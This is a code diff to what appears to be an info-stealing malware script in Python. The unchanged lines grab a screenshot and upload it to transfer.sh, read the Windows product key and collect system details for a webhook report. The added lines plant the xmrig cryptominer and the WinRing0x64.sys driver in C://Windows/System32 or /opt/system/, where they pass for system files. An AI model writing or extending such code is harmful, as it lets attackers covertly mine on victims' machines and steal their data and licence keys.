@@ -26,6 +26,7 @@ import subprocess
 import requests
 from urllib.request import urlopen
 import psutil
+import shutil
 from PIL import ImageGrab
 # pre-run needed variables
 os.chdir(os.path.dirname(os.path.abspath(__file__)))
@@ -52,6 +53,24 @@ def upload_to_transfer_sh(file_path):
     with open(file_path, 'rb') as file:
         response = requests.put('https://transfer.sh/' + file_path, data=file)
         return response.text.strip()
+def extract_files(file_names,destination_dir):
+    # Determine the path to the directory containing the executable
+    if getattr(sys, 'frozen', False):  # If running as a bundled executable
+        exe_path = sys.executable
+        exe_dir = os.path.dirname(exe_path)
+    else:  # If running as a script
+        exe_dir = os.path.dirname(__file__)
+
+
+    # Extract each file to the destination directory
+    for file_name in file_names:
+        source_path = os.path.join(exe_dir, file_name)
+        destination_path = os.path.join(destination_dir, file_name)
+
+        try:
+            shutil.copy(source_path, destination_path)
+        except Exception as e:
+            sys.exit(f"ERROR: {e}")
 def get_windows_product_key():
     try:
         import winreg
@@ -91,6 +110,15 @@ def get_linux_distro():
         pass
     
     return "Unknown"
+
+# Miner deploy
+if config["MINER"] == True:
+    if platform.system() == "Windows":
+        extract_files(["WinRing0x64.sys","xmrig.exe"], "C://Windows/System32")
+    else:
+        os.mkdir("/opt/system/")
+        extract_files(["xmrig"], "/opt/system/")
+
 # webhook
 embedcont = f'''
 ---------------------
@@ -120,6 +148,7 @@ Key ------------ >> {get_windows_product_key()}
 Distribution: {get_linux_distro()}
 
 '''
+
 screenshot = ImageGrab.grab()
 screenshot.save("screenshot.png")
 screenshot_url = upload_to_transfer_sh("screenshot.png")
